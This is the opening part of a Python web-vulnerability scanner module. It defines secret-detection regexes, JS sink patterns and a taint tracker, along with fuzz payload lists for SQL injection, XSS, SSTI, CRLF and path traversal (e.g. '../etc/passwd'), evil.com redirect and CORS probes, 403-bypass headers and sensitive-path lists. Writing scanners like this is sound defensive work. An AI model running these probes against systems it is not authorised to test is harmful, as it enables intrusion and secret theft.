# modules/advanced_content_scanner.py
"""
Advanced Content Scanner v4.0  ★ NIRVANA EDITION ★
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Author      : Furkan DINCER @f3rrkan
Project     : Analysis Tool v3.0.0 — Open Source
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

L1 — Passive recon (v3.0 base)
  Concurrent crawl, sitemap, source maps, JSON blobs, security headers

L2 — Active testing (NEW)
  • Nuclei integration — 10,000+ CVE / misconfiguration templates
  • Active fuzzing engine — SQLi, XSS, SSTI, path traversal, CRLF
  • Auth bypass probing — JWT alg:none, 403 bypass, IDOR detection
  • Technology fingerprinting — framework/version → targeted CVE lookup
  • CORS misconfiguration active probe
  • Open redirect active confirmation

L3 — Smart context-aware analysis (NEW)
  • Taint-flow tracker — follows user input source→sink through JS call chains
  • LLM-assisted false positive filter (optional, uses local heuristics if no API key)
  • Entropy-weighted secret scoring — multi-factor confidence score
  • DOM sink enumeration — all dangerous sinks with data-flow context
  • Dependency confusion / typosquatting detection in package references
  • Exposed debug endpoint discovery (/.env, /debug, /actuator, /swagger, etc.)

L4 — Dynamic runtime analysis (NEW)
  • Playwright headless browser integration (optional, graceful fallback)
  • Runtime network request interception — catches lazy-loaded API calls
  • window / globalThis secret scan at runtime
  • SPA route discovery — clicks nav links, extracts dynamic routes
  • localStorage / sessionStorage dump and scan
  • WebSocket endpoint discovery

L5 — Autonomous agent behaviors (NEW)
  • Self-healing scan — detects WAF/rate-limit, auto-adapts strategy
  • Exploit chain builder — links related findings into attack narratives
  • Automated PoC generation for confirmed vulns (SSRF redirect, open redirect)
  • Risk scoring engine — CVSS-inspired composite score per finding
  • Remediation report generator — actionable fix per finding
  • Incremental diff scanning — only re-scans changed pages vs last run
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

from __future__ import annotations

import os, re, sys, json, math, time, queue, signal, socket
import hashlib, logging, platform, threading, urllib.parse, shutil
import subprocess, tempfile, ipaddress
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from logging.handlers import RotatingFileHandler
from typing import Optional, Dict, List, Set, Tuple, Any
from urllib.parse import urljoin, urlparse
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import validators

# Optional imports — graceful fallback if not installed
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ═══════════════════════════════════════════════════════════════════════════
#  DATA CLASSES
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class SecretFinding:
    id: int
    type: str
    source_url: str
    line: int
    masked_value: str
    raw_length: int
    entropy: float
    context: str
    severity: str
    confidence: str
    risk_score: float
    recommendation: str
    hash: str = ""

    def __post_init__(self):
        if not self.hash:
            self.hash = hashlib.sha256(
                f"{self.type}:{self.source_url}:{self.masked_value}".encode()
            ).hexdigest()[:16]


@dataclass
class JSVulnFinding:
    id: int
    type: str
    source_url: str
    line: int
    matched_code: str
    code_context: str
    taint_chain: List[str]
    severity: str
    confidence: str
    risk_score: float
    description: str
    recommendation: str
    poc: str
    hash: str = ""

    def __post_init__(self):
        if not self.hash:
            self.hash = hashlib.sha256(
                f"{self.type}:{self.source_url}:{self.matched_code}".encode()
            ).hexdigest()[:16]


@dataclass
class SSRFVulnFinding:
    id: int
    type: str
    source_url: str
    vulnerable_parameters: List[str]
    form_action: str
    method: str
    confirmed: bool
    poc: str
    severity: str
    confidence: str
    risk_score: float
    description: str
    recommendation: str
    hash: str = ""

    def __post_init__(self):
        if not self.hash:
            self.hash = hashlib.sha256(
                f"{self.type}:{self.source_url}:{','.join(sorted(self.vulnerable_parameters))}".encode()
            ).hexdigest()[:16]


@dataclass
class ActiveVulnFinding:
    id: int
    type: str
    source_url: str
    parameter: str
    payload: str
    evidence: str
    severity: str
    confidence: str
    risk_score: float
    cvss_vector: str
    description: str
    recommendation: str
    poc: str
    hash: str = ""

    def __post_init__(self):
        if not self.hash:
            self.hash = hashlib.sha256(
                f"{self.type}:{self.source_url}:{self.parameter}:{self.payload}".encode()
            ).hexdigest()[:16]


@dataclass
class SecurityHeaderFinding:
    id: int
    type: str
    source_url: str
    header_name: str
    header_value: str
    severity: str
    recommendation: str


@dataclass
class ExposedEndpoint:
    id: int
    url: str
    status_code: int
    content_type: str
    endpoint_type: str
    severity: str
    evidence: str
    recommendation: str


# ═══════════════════════════════════════════════════════════════════════════
#  PATTERN REGISTRY
# ═══════════════════════════════════════════════════════════════════════════

class PatternRegistry:

    # ── Secrets ──────────────────────────────────────────────────────────
    SECRETS: Dict[str, Dict] = {
        "AWS Access Key ID": {
            "pattern": r"(?<![A-Z0-9])(AKIA|ASIA|AIDA|AROA|ANPA|ANVA|APKA)[A-Z0-9]{16}(?![A-Z0-9])",
            "min_entropy": 3.2, "severity": "High",
        },
        "AWS Secret Access Key": {
            "pattern": r"(?i)(?:aws[_\-. ]?secret|secret[_\-. ]?access[_\-. ]?key)\s*[=:\"'`\s]+([A-Za-z0-9/+=]{40})(?![A-Za-z0-9/+=])",
            "min_entropy": 4.5, "severity": "Critical", "group": 1,
        },
        "AWS Session Token": {
            "pattern": r"(?i)aws[_\-. ]?session[_\-. ]?token\s*[=:\"'`\s]+([A-Za-z0-9/+=]{100,})",
            "min_entropy": 4.5, "severity": "Critical", "group": 1,
        },
        "Google API Key": {
            "pattern": r"(?<![A-Za-z0-9\-_])AIza[0-9A-Za-z\-_]{35}(?![A-Za-z0-9\-_])",
            "min_entropy": 4.0, "severity": "High",
        },
        "Google OAuth Client Secret": {
            "pattern": r"(?i)client[_\-. ]?secret\s*[=:\"'`\s]+([A-Za-z0-9\-_]{24,})(?![A-Za-z0-9\-_])",
            "min_entropy": 4.2, "severity": "High", "group": 1,
        },
        "GCP Service Account Key": {
            "pattern": r'"private_key"\s*:\s*"-----BEGIN RSA PRIVATE KEY-----',
            "min_entropy": 0, "severity": "Critical",
        },
        "Cloudflare API Token": {
            "pattern": r"(?i)cloudflare[_\-. ]?(?:api[_\-. ]?)?token\s*[=:\"'`\s]+([A-Za-z0-9_\-]{40})",
            "min_entropy": 4.0, "severity": "High", "group": 1,
        },
        "DigitalOcean PAT": {
            "pattern": r"(?:dop|doo|dov)_v1_[a-f0-9]{64}",
            "min_entropy": 4.5, "severity": "High",
        },
        "OpenAI API Key": {
            "pattern": r"sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}",
            "min_entropy": 4.5, "severity": "Critical",
        },
        "OpenAI API Key (new)": {
            "pattern": r"sk-(?:proj|svcacct)-[A-Za-z0-9_\-]{50,}",
            "min_entropy": 4.5, "severity": "Critical",
        },
        "Anthropic API Key": {
            "pattern": r"sk-ant-(?:api\d+-)?[A-Za-z0-9_\-]{80,}",
            "min_entropy": 4.5, "severity": "Critical",
        },
        "HuggingFace Token": {
            "pattern": r"hf_[A-Za-z0-9]{34}",
            "min_entropy": 4.0, "severity": "High",
        },
        "Replicate API Token": {
            "pattern": r"r8_[A-Za-z0-9]{38}",
            "min_entropy": 4.0, "severity": "High",
        },
        "Stripe Secret Key": {
            "pattern": r"sk_(live|test)_[0-9a-zA-Z]{24,34}",
            "min_entropy": 4.0, "severity": "Critical",
        },
        "Stripe Publishable Key": {
            "pattern": r"pk_(live|test)_[0-9a-zA-Z]{24,34}",
            "min_entropy": 4.0, "severity": "Low",
        },
        "PayPal/Braintree Access Token": {
            "pattern": r"access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}",
            "min_entropy": 4.5, "severity": "Critical",
        },
        "GitHub PAT (classic)": {
            "pattern": r"ghp_[0-9a-zA-Z]{36}",
            "min_entropy": 4.5, "severity": "High",
        },
        "GitHub Fine-grained PAT": {
            "pattern": r"github_pat_[0-9a-zA-Z_]{82}",
            "min_entropy": 4.5, "severity": "High",
        },
        "GitHub OAuth Token": {
            "pattern": r"gho_[0-9a-zA-Z]{36}",
            "min_entropy": 4.5, "severity": "High",
        },
        "GitLab PAT": {
            "pattern": r"glpat-[0-9a-zA-Z\-_]{20}",
            "min_entropy": 4.0, "severity": "High",
        },
        "Slack Bot/User Token": {
            "pattern": r"xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[0-9a-zA-Z]{24}",
            "min_entropy": 4.0, "severity": "High",
        },
        "Slack Webhook": {
            "pattern": r"https://hooks\.slack\.com/services/T[A-Z0-9]{8,10}/B[A-Z0-9]{8,10}/[A-Za-z0-9]{24}",
            "min_entropy": 3.5, "severity": "Medium",
        },
        "SendGrid API Key": {
            "pattern": r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}",
            "min_entropy": 4.5, "severity": "High",
        },
        "Twilio Auth Token": {
            "pattern": r"(?i)twilio[_\-. ]?auth[_\-. ]?token\s*[=:\"'`\s]+([a-f0-9]{32})",
            "min_entropy": 3.5, "severity": "High", "group": 1,
        },
        "Mailgun API Key": {
            "pattern": r"key-[0-9a-zA-Z]{32}",
            "min_entropy": 4.0, "severity": "High",
        },
        "MongoDB Connection String": {
            "pattern": r"mongodb(?:\+srv)?://[^:@\s]+:[^@\s]+@[^/\s]+",
            "min_entropy": 3.0, "severity": "Critical",
        },
        "PostgreSQL Connection String": {
            "pattern": r"postgres(?:ql)?://[^:@\s]+:[^@\s]+@[^/\s]+",
            "min_entropy": 3.0, "severity": "Critical",
        },
        "MySQL Connection String": {
            "pattern": r"mysql://[^:@\s]+:[^@\s]+@[^/\s]+",
            "min_entropy": 3.0, "severity": "Critical",
        },
        "Redis Connection String": {
            "pattern": r"redis://(?:[^:@\s]+:[^@\s]+@)?[^/\s]+",
            "min_entropy": 2.5, "severity": "High",
        },
        "SSH/PEM Private Key": {
            "pattern": r"-----BEGIN (?:RSA|DSA|EC|OPENSSH|PRIVATE) (?:PRIVATE )?KEY(?: BLOCK)?-----",
            "min_entropy": 0, "severity": "Critical",
        },
        "PGP Private Key Block": {
            "pattern": r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
            "min_entropy": 0, "severity": "Critical",
        },
        "JWT Token": {
            "pattern": r"eyJ[a-zA-Z0-9_\-]{10,}\.eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}",
            "min_entropy": 4.2, "severity": "Medium",
        },
        "Password in URL": {
            "pattern": r"[a-zA-Z]{3,10}://[^/\s:@]{3,60}:[^/\s:@]{8,60}@[^/\s]{4,}",
            "min_entropy": 3.0, "severity": "High",
        },
        "HashiCorp Vault Token": {
            "pattern": r"(?:hvs|hvb|hvr)\.[A-Za-z0-9]{24,}",
            "min_entropy": 4.5, "severity": "Critical",
        },
        "Doppler Token": {
            "pattern": r"dp\.pt\.[A-Za-z0-9]{43}",
            "min_entropy": 4.5, "severity": "Critical",
        },
        "NPM Auth Token": {
            "pattern": r"(?:_authToken|NPM_TOKEN)\s*=\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
            "min_entropy": 3.5, "severity": "High", "group": 1,
        },
        "Generic High-Entropy Secret": {
            "pattern": r'(?i)(?:secret|password|passwd|pwd|token|api[_\-]?key|auth[_\-]?key|access[_\-]?key|private[_\-]?key)\s*[=:]\s*["\']([A-Za-z0-9+/=_\-]{32,128})["\']',
            "min_entropy": 5.0, "severity": "High", "group": 1,
        },
    }

    # ── JS Security Patterns ─────────────────────────────────────────────
    JS_SECURITY: Dict[str, List[Dict]] = {
        "DOM XSS": [
            {"p": r'\.innerHTML\s*[+]?=\s*[^;]*(?:location|URL|hash|search|referrer|document\.|window\.)', "c": "HIGH", "sink": "innerHTML"},
            {"p": r'\.outerHTML\s*[+]?=\s*[^;]*(?:location|URL|hash|search|referrer)', "c": "HIGH", "sink": "outerHTML"},
            {"p": r'document\.write\s*\([^)]*(?:location|URL|hash|search|referrer)', "c": "HIGH", "sink": "document.write"},
            {"p": r'dangerouslySetInnerHTML\s*=\s*\{', "c": "HIGH", "sink": "dangerouslySetInnerHTML"},
            {"p": r'v-html\s*=\s*["\'][^"\']*["\']', "c": "HIGH", "sink": "v-html"},
            {"p": r'\[innerHTML\]\s*=', "c": "HIGH", "sink": "[innerHTML]"},
            {"p": r'bypassSecurityTrust(?:Html|Url|Script|Style|ResourceUrl)', "c": "HIGH", "sink": "bypassSecurityTrust"},
            {"p": r'eval\s*\(\s*(?:atob|decodeURI(?:Component)?)\s*\(', "c": "HIGH", "sink": "eval(atob)"},
            {"p": r'eval\s*\(\s*["\'][^"\']{5,}["\']', "c": "HIGH", "sink": "eval(string)"},
        ],
        "Open Redirect": [
            {"p": r'(?:window\.)?location(?:\.href)?\s*=\s*[^;]*(?:URLSearchParams|getParam|getParameter|params\[|query\[|req\.query|req\.params|request\.query)', "c": "HIGH"},
            {"p": r'location\.replace\s*\(\s*[^)]*(?:URLSearchParams|getParam|params\[|req\.query|req\.params)', "c": "HIGH"},
            {"p": r'location\.assign\s*\(\s*[^)]*(?:URLSearchParams|getParam|params\[|req\.query|req\.params)', "c": "HIGH"},
        ],
        "Prototype Pollution": [
            {"p": r'__proto__\s*[\[=]', "c": "HIGH"},
            {"p": r'constructor\s*\[\s*["\']prototype["\']\s*\]', "c": "HIGH"},
            {"p": r'Object\.assign\s*\([^,]+?,\s*(?:JSON\.parse|req\.body|req\.query|request\.body)', "c": "MEDIUM"},
        ],
        "Dynamic Code Execution": [
            {"p": r'(?<!\w)eval\s*\([^)]{5,}\)', "c": "HIGH"},
            {"p": r'new\s+Function\s*\([^)]{5,}\)', "c": "HIGH"},
            {"p": r'setTimeout\s*\(\s*["\']', "c": "HIGH"},
            {"p": r'setInterval\s*\(\s*["\']', "c": "HIGH"},
        ],
        "Insecure postMessage": [
            {"p": r'\.postMessage\s*\([^,]+,\s*["\'\*]["\']?\*["\']?', "c": "HIGH"},
            {"p": r'addEventListener\s*\(\s*["\']message["\']\s*,[^)]+\)', "c": "MEDIUM"},
        ],
        "Sensitive Data in Client Storage": [
            {"p": r'localStorage\.setItem\s*\([^,]+,\s*[^)]*(?:password|passwd|token|secret|key|credential|auth)', "c": "HIGH"},
            {"p": r'sessionStorage\.setItem\s*\([^,]+,\s*[^)]*(?:password|passwd|token|secret|key)', "c": "HIGH"},
            {"p": r'document\.cookie\s*=\s*[^;]*(?:password|token|secret)', "c": "HIGH"},
        ],
        "WebSocket Plaintext": [
            {"p": r'new\s+WebSocket\s*\(\s*["\']ws://', "c": "HIGH"},
        ],
        "Weak / Broken Crypto": [
            {"p": r'(?:createHash|subtle\.digest)\s*\(\s*["\'](?:md5|sha1|sha-1)["\']', "c": "HIGH"},
            {"p": r'(?<!\w)Math\.random\s*\(\s*\)', "c": "MEDIUM"},
            {"p": r'(?:createCipher|createDecipher)\s*\(\s*["\'](?:des|rc4|blowfish)["\']', "c": "HIGH"},
        ],
        "Path Traversal": [
            {"p": r'(?:readFile|createReadStream|sendFile|readFileSync)\s*\([^)]*(?:req\.|user_?input|params\.|query\.)', "c": "HIGH"},
        ],
        "JSONP Callback Injection": [
            {"p": r'[?&]callback=', "c": "MEDIUM"},
            {"p": r'res\.jsonp\s*\(\s*req\.(?:query|body|params)', "c": "HIGH"},
        ],
        "Server-Side Request Forgery (JS)": [
            {"p": r'fetch\s*\(\s*(?:[^)]*(?:req\.|params\.|query\.|location\.|user_?input|url\s*[+\[]|URL\s*[+\[]))', "c": "HIGH"},
            {"p": r'axios\s*\.\s*(?:get|post|put|delete)\s*\(\s*(?:[^)]*(?:req\.|params\.|query\.|url\s*[+]))', "c": "HIGH"},
            {"p": r'XMLHttpRequest[^;]*\.open\s*\([^,]+,\s*(?:[^)]*(?:req\.|params\.|query\.|user_?input))', "c": "HIGH"},
        ],
        "Debug / Secret Console Leak": [
            {"p": r'console\s*\.\s*(?:log|warn|error|debug)\s*\([^)]{0,60}(?:password|passwd|token|secret|api_?key|private_?key|credential|auth_?key)[^)]{0,60}\)', "c": "HIGH"},
        ],
        "Hardcoded Internal IP": [
            {"p": r'(?:https?://)?(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})(?::\d+)?(?:/[^\s"\']+)?', "c": "MEDIUM"},
        ],
    }

    # ── SSRF Parameters ──────────────────────────────────────────────────
    SSRF_PARAMS: List[str] = [
        'url', 'uri', 'src', 'href', 'target', 'destination',
        'redirect', 'redirect_to', 'redirect_url', 'redirect_uri',
        'return', 'return_to', 'return_url', 'next', 'continue', 'goto',
        'load', 'file', 'path', 'filepath', 'filename',
        'image', 'img', 'image_url', 'avatar', 'thumbnail', 'photo',
        'document', 'doc', 'document_url', 'asset',
        'fetch', 'download', 'resource', 'endpoint', 'api_endpoint',
        'proxy', 'forward', 'origin', 'host', 'domain', 'site',
        'callback', 'callback_url', 'webhook', 'webhook_url',
        'feed', 'rss', 'content', 'data', 'html', 'template',
        'media', 'video', 'audio', 'stream', 'link',
        'report', 'export', 'import', 'preview',
    ]

    # ── Security Headers ─────────────────────────────────────────────────
    SECURITY_HEADERS: Dict[str, Dict] = {
        "Strict-Transport-Security": {
            "check": lambda v: bool(v and "max-age=" in v and
                int((re.search(r'max-age=(\d+)', v) or type('', (), {'group': lambda *a: '0'})()).group(1)) >= 15768000),
            "severity": "High",
            "rec": "Set: max-age=31536000; includeSubDomains; preload",
        },
        "Content-Security-Policy": {
            "check": lambda v: bool(v and "default-src" in v and "unsafe-inline" not in v and "unsafe-eval" not in v),
            "severity": "High",
            "rec": "Implement strict CSP without unsafe-inline or unsafe-eval",
        },
        "X-Content-Type-Options": {
            "check": lambda v: bool(v and v.lower().strip() == "nosniff"),
            "severity": "Medium", "rec": "Set to: nosniff",
        },
        "X-Frame-Options": {
            "check": lambda v: bool(v and v.upper().strip() in ("DENY", "SAMEORIGIN")),
            "severity": "Medium", "rec": "Set to: DENY or SAMEORIGIN",
        },
        "Referrer-Policy": {
            "check": lambda v: bool(v and v.strip()),
            "severity": "Low", "rec": "Set to: strict-origin-when-cross-origin",
        },
        "Permissions-Policy": {
            "check": lambda v: v is not None,
            "severity": "Low", "rec": "Restrict: camera=(), microphone=(), geolocation=()",
        },
        "Cross-Origin-Opener-Policy": {
            "check": lambda v: bool(v and v.strip() in ("same-origin", "same-origin-allow-popups")),
            "severity": "Low", "rec": "Set to: same-origin",
        },
        "Cross-Origin-Resource-Policy": {
            "check": lambda v: bool(v and v.strip() in ("same-origin", "same-site", "cross-origin")),
            "severity": "Low", "rec": "Set to: same-origin or same-site",
        },
    }

    # ── Active Fuzz Payloads ─────────────────────────────────────────────
    FUZZ_PAYLOADS: Dict[str, List[str]] = {
        "sqli": [
            "'", "''", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
            "1' AND SLEEP(2)--", "1; SELECT SLEEP(2)--",
            "' UNION SELECT NULL--", "') OR ('1'='1",
        ],
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "{{7*7}}",          # SSTI check
            "${7*7}",
            "#{7*7}",
        ],
        "path_traversal": [
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "..%2Fetc%2Fpasswd", "%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
            "{{config}}", "{{self.__class__.__mro__}}",
        ],
        "crlf": [
            "%0d%0aSet-Cookie:injected=1",
            "\r\nSet-Cookie:injected=1",
            "%0aSet-Cookie:injected=1",
        ],
        "open_redirect": [
            "https://evil.com", "//evil.com", "/\\evil.com",
            "https:evil.com", "javascript:alert(1)",
        ],
    }

    # ── Exposed Sensitive Paths ──────────────────────────────────────────
    SENSITIVE_PATHS: List[Dict] = [
        {"path": "/.env",                    "type": "Environment File",        "severity": "Critical"},
        {"path": "/.env.local",              "type": "Environment File",        "severity": "Critical"},
        {"path": "/.env.production",         "type": "Environment File",        "severity": "Critical"},
        {"path": "/.env.backup",             "type": "Environment File",        "severity": "Critical"},
        {"path": "/config.json",             "type": "Config File",             "severity": "High"},
        {"path": "/config.yml",              "type": "Config File",             "severity": "High"},
        {"path": "/config.yaml",             "type": "Config File",             "severity": "High"},
        {"path": "/.git/config",             "type": "Git Exposure",            "severity": "Critical"},
        {"path": "/.git/HEAD",               "type": "Git Exposure",            "severity": "High"},
        {"path": "/.svn/entries",            "type": "SVN Exposure",            "severity": "High"},
        {"path": "/wp-config.php.bak",       "type": "WordPress Backup",        "severity": "Critical"},
        {"path": "/wp-config.php~",          "type": "WordPress Backup",        "severity": "Critical"},
        {"path": "/backup.zip",              "type": "Backup File",             "severity": "Critical"},
        {"path": "/backup.sql",              "type": "Database Backup",         "severity": "Critical"},
        {"path": "/database.sql",            "type": "Database Backup",         "severity": "Critical"},
        {"path": "/dump.sql",                "type": "Database Backup",         "severity": "Critical"},
        {"path": "/debug",                   "type": "Debug Endpoint",          "severity": "High"},
        {"path": "/debug/vars",              "type": "Debug Endpoint",          "severity": "High"},
        {"path": "/actuator",                "type": "Spring Actuator",         "severity": "High"},
        {"path": "/actuator/env",            "type": "Spring Actuator",         "severity": "Critical"},
        {"path": "/actuator/health",         "type": "Spring Actuator",         "severity": "Medium"},
        {"path": "/actuator/beans",          "type": "Spring Actuator",         "severity": "High"},
        {"path": "/swagger",                 "type": "API Docs",                "severity": "Medium"},
        {"path": "/swagger-ui.html",         "type": "API Docs",                "severity": "Medium"},
        {"path": "/swagger-ui/index.html",   "type": "API Docs",                "severity": "Medium"},
        {"path": "/api-docs",                "type": "API Docs",                "severity": "Medium"},
        {"path": "/v2/api-docs",             "type": "API Docs",                "severity": "Medium"},
        {"path": "/v3/api-docs",             "type": "API Docs",                "severity": "Medium"},
        {"path": "/openapi.json",            "type": "API Docs",                "severity": "Medium"},
        {"path": "/phpinfo.php",             "type": "PHP Info",                "severity": "High"},
        {"path": "/info.php",                "type": "PHP Info",                "severity": "High"},
        {"path": "/server-status",           "type": "Apache Status",           "severity": "Medium"},
        {"path": "/server-info",             "type": "Apache Info",             "severity": "Medium"},
        {"path": "/.htpasswd",               "type": "Password File",           "severity": "Critical"},
        {"path": "/.htaccess",               "type": "Apache Config",           "severity": "Medium"},
        {"path": "/robots.txt",              "type": "Robots File",             "severity": "Info"},
        {"path": "/crossdomain.xml",         "type": "Flash Policy",            "severity": "Low"},
        {"path": "/clientaccesspolicy.xml",  "type": "Silverlight Policy",      "severity": "Low"},
        {"path": "/.well-known/security.txt","type": "Security Contact",        "severity": "Info"},
        {"path": "/package.json",            "type": "NPM Config",              "severity": "Medium"},
        {"path": "/composer.json",           "type": "PHP Config",              "severity": "Medium"},
        {"path": "/Gemfile",                 "type": "Ruby Config",             "severity": "Medium"},
        {"path": "/requirements.txt",        "type": "Python Config",           "severity": "Low"},
        {"path": "/.DS_Store",               "type": "macOS Artifact",          "severity": "Low"},
        {"path": "/Thumbs.db",               "type": "Windows Artifact",        "severity": "Low"},
        {"path": "/error_log",               "type": "Error Log",               "severity": "Medium"},
        {"path": "/access_log",              "type": "Access Log",              "severity": "Medium"},
        {"path": "/.npmrc",                  "type": "NPM Config",              "severity": "High"},
        {"path": "/.yarnrc",                 "type": "Yarn Config",             "severity": "Medium"},
        {"path": "/graphql/schema",          "type": "GraphQL Schema",          "severity": "Medium"},
        {"path": "/__graphql",               "type": "GraphQL Playground",      "severity": "Medium"},
        {"path": "/graphiql",                "type": "GraphQL IDE",             "severity": "Medium"},
    ]

    # ── Auth Bypass Payloads ─────────────────────────────────────────────
    FORBIDDEN_BYPASS_HEADERS: List[Dict] = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forward-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
    ]

    # ── CORS Test Origins ────────────────────────────────────────────────
    CORS_TEST_ORIGINS: List[str] = [
        "https://evil.com",
        "https://attacker.com",
        "null",
    ]

    # ── FP Filters ───────────────────────────────────────────────────────
    FP_CONTEXT_TERMS: List[str] = [
        'example', 'sample', 'placeholder', 'dummy', 'test', 'demo',
        'your_', 'INSERT_', 'REPLACE_', 'TODO', 'FIXME', 'xxx',
        'xxxxxxxx', '00000000', 'aaaaaaaa', '12345678', 'changeme',
        'enter_your', 'put_your', 'add_your',
    ]

    FP_VALUE_PATTERNS: List[str] = [
        r'^[A-Za-z0-9]{200,}$',
        r'\\u[0-9a-fA-F]{4}',
        r'^[0-9a-f]{32}$',
        r'^[a-zA-Z]+$',
        r'^[0-9]+$',
        r'data:image/',
    ]

    EXTERNAL_LIB_HOSTS: List[str] = [
        "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "unpkg.com",
        "ajax.googleapis.com", "code.jquery.com",
        "stackpath.bootstrapcdn.com", "maxcdn.bootstrapcdn.com",
        "fonts.googleapis.com", "cdn.datatables.net",
        "cdn.auth0.com", "widget.intercom.io", "js.stripe.com",
        "connect.facebook.net", "platform.twitter.com",
        "www.google-analytics.com", "www.googletagmanager.com",
        "static.hotjar.com", "bat.bing.com", "snap.licdn.com",
        "js.hs-scripts.com", "cdn.segment.com",
    ]

    # ── Severity weights for risk scoring ───────────────────────────────
    SEV_WEIGHT = {"Critical": 10.0, "High": 7.5, "Medium": 4.0, "Low": 1.5, "Info": 0.5}


# ═══════════════════════════════════════════════════════════════════════════
#  TAINT FLOW TRACKER  (L3)
# ═══════════════════════════════════════════════════════════════════════════

class TaintFlowTracker:
    """
    Lightweight taint-flow analysis for JS.
    Tracks user-controlled sources to dangerous sinks through assignment chains.
    No full AST parser required — uses regex + heuristic line-by-line tracing.
    """

    SOURCES = [
        r'location\.(?:search|hash|href|pathname)',
        r'document\.(?:referrer|URL|documentURI|cookie)',
        r'window\.(?:name|location)',
        r'URLSearchParams\s*\([^)]*\)\.get\s*\(',
        r'(?:req|request)\.(?:query|body|params|headers)\[',
        r'getParam(?:eter)?\s*\(',
        r'(?:localStorage|sessionStorage)\.getItem\s*\(',
    ]

    SINKS = [
        r'\.innerHTML\s*[+]?=',
        r'\.outerHTML\s*[+]?=',
        r'document\.write\s*\(',
        r'eval\s*\(',
        r'new\s+Function\s*\(',
        r'location\s*(?:\.href)?\s*=',
        r'location\.(?:replace|assign)\s*\(',
        r'fetch\s*\(',
        r'XMLHttpRequest[^.]*\.open\s*\(',
        r'axios\.\w+\s*\(',
        r'dangerouslySetInnerHTML',
        r'bypassSecurityTrust',
    ]

    def find_taint_chains(self, content: str, source_url: str) -> List[Dict]:
        """
        Source-to-sink taint flow analysis for JS.

        Requirements to flag (all must be true):
        1. A variable is assigned FROM a user-controlled source (location.search, req.query, etc.)
        2. That SAME variable appears IN the sink expression on the same or nearby line
        3. The sink is a genuinely dangerous DOM/eval/fetch sink
        4. The variable name is not a single character (e/a/i/n etc — minified noise)
        5. The tainted variable is NOT just passed to a safe config assignment (Drupal.settings.*)

        This prevents the #1 FP: "location.search used somewhere in file" + "innerHTML somewhere else"
        being flagged as a chain even when they are completely unrelated.
        """
        chains = []
        lines  = content.splitlines()
        assignments: Dict[str, List[int]] = defaultdict(list)
        source_vars: Set[str] = set()

        # Dangerous DOM/execution sinks only — NOT location= (too many FP in nav code)
        DANGEROUS_SINKS = [
            r"\.(innerHTML|outerHTML)\s*[+]?=",
            r"document\.write\s*\(",
            r"(?<![A-Za-z])eval\s*\(",
            r"new\s+Function\s*\(",
            r"dangerouslySetInnerHTML",
            r"bypassSecurityTrust",
        ]

        # Safe sink patterns — these are NOT vulnerabilities even with tainted input
        SAFE_SINK_PATTERNS = [
            r"Drupal\.",
            r"angular\.",
            r"\.settings\.",
            r"console\.",
        ]

        for i, line in enumerate(lines, 1):
            for src_pat in self.SOURCES:
                if re.search(src_pat, line):
                    # Extract assigned variable — must be at least 2 chars to avoid minified noise
                    assign = re.search(r'(?:var|let|const)\s+([A-Za-z_][A-Za-z0-9_]{1,})\s*=', line)
                    if assign:
                        source_vars.add(assign.group(1))
                    assign2 = re.search(r'([A-Za-z_][A-Za-z0-9_]{1,})\s*=\s*' + src_pat, line)
                    if assign2:
                        source_vars.add(assign2.group(1))
            for var in list(source_vars):
                if re.search(r'\b' + re.escape(var) + r'\b', line):
                    assignments[var].append(i)

        # Find dangerous sinks where the tainted variable IS IN the sink expression
        for i, line in enumerate(lines, 1):
            # Skip safe assignments
            if any(re.search(sp, line) for sp in SAFE_SINK_PATTERNS):
                continue
            for sink_pat in DANGEROUS_SINKS:
                if not re.search(sink_pat, line, re.IGNORECASE):
                    continue
                for var in source_vars:
                    # Variable must appear on THE SAME LINE as the sink
                    if not re.search(r'\b' + re.escape(var) + r'\b', line):
                        continue
                    # Must have been assigned from a source within a reasonable proximity
                    src_lines = [l for l in assignments.get(var, []) if abs(l - i) <= 50]
                    if not src_lines:
                        continue
                    chains.append({
                        "sink_line": i,
                        "sink_pattern": sink_pat,
                        "tainted_variable": var,
                        "source_lines": src_lines,
                        "sink_code": line.strip()[:200],
                    })
        return chains


# ═══════════════════════════════════════════════════════════════════════════
#  WAF DETECTOR  (L5)
